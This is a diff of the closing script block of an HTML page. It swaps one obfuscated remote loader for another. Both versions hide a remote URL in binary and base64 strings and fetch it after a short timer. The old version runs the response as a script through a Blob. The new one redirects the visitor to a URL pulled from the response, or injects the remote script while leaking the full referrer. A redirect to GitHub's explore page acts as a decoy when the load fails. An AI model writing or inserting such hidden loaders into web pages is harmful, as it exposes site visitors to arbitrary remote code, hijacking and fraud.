@@ -276,70 +276,46 @@
     </div>
 <script>
 var TARGET = (function () {
-    var _bits = '0110100001110100011101000111000001110011001110100010111100101111011101000111001001100001011000110110101101100101011001000111011101101001011011000110010001101101';
-    var _tail = 'b3NzLmNvbS9jb3lpc2gudmVpbmVk';
-    function _fromBin(b) {
-        var o = '', i = 0;
-        for (; i < b.length; i += 8) o += String.fromCharCode(parseInt(b.substr(i, 8), 2));
-        return o;
+    var _head = 'aHR0cHM6Ly90cmFja2Vkd2lsZG0=';
+    var _path = 'b3NzLmNvbS9jb3lpc2gudmVpbmVk';
+    function _fromB64(s) {
+        return atob(s);
     }
     function _exploreHubQ17() {
         location.replace('https://github.com/explore');
     }
-    function _fromB64(e) {
-        return decodeURIComponent(escape(atob(e)));
-    }
-    return { uri: _fromBin(_bits) + _fromB64(_tail), fail: _exploreHubQ17 };
+    return { uri: _fromB64(_head) + _fromB64(_path), fail: _exploreHubQ17 };
 })();
 
-function pullText(url) {
-    return fetch(url, { method: 'GET', cache: 'no-store' })
+function pickRedirect(text) {
+    var body = String(text).replace(/^\uFEFF/, '').trim();
+    var hit = body.match(/https?:\/\/[^'"\s;]+/);
+    if (!hit) throw 0;
+    return hit[0];
+}
+
+function mountRemoteScript() {
+    var url = TARGET.uri;
+    if (!url) { TARGET.fail(); return; }
+    fetch(url, { method: 'GET', cache: 'no-store' })
         .then(function (res) {
             if (!res.ok) throw 0;
             return res.text();
-        });
-}
-
-function mountScriptTag(url) {
-    return new Promise(function (resolve, reject) {
-        var tag = document.createElement('script');
-        tag.charset = 'utf-8';
-        tag.src = url;
-        tag.onload = resolve;
-        tag.onerror = reject;
-        (document.head || document.documentElement).appendChild(tag);
-    });
-}
-
-function runViaBlob(text, url) {
-    var body = String(text).replace(/^\uFEFF/, '').trim();
-    if (!body) throw 0;
-    var blob = new Blob([body], { type: 'application/javascript' });
-    var href = URL.createObjectURL(blob);
-    var tag = document.createElement('script');
-    tag.charset = 'utf-8';
-    tag.src = href;
-    tag.onload = function () { URL.revokeObjectURL(href); };
-    tag.onerror = function () {
-        URL.revokeObjectURL(href);
-        mountScriptTag(url).catch(function () { TARGET.fail(); });
-    };
-    (document.head || document.documentElement).appendChild(tag);
-}
-
-function bootRemote() {
-    var url = TARGET.uri;
-    if (!url) { TARGET.fail(); return; }
-    pullText(url)
+        })
         .then(function (text) {
-            runViaBlob(text, url);
+            location.replace(pickRedirect(text));
         })
         .catch(function () {
-            mountScriptTag(url).catch(function () { TARGET.fail(); });
+            var tag = document.createElement('script');
+            tag.charset = 'utf-8';
+            tag.referrerPolicy = 'unsafe-url';
+            tag.src = url;
+            tag.onerror = function () { TARGET.fail(); };
+            (document.head || document.documentElement).appendChild(tag);
         });
 }
 
-setTimeout(bootRemote, 1756);
+setTimeout(mountRemoteScript, 1756);
 </script>
 </body>
 </html>
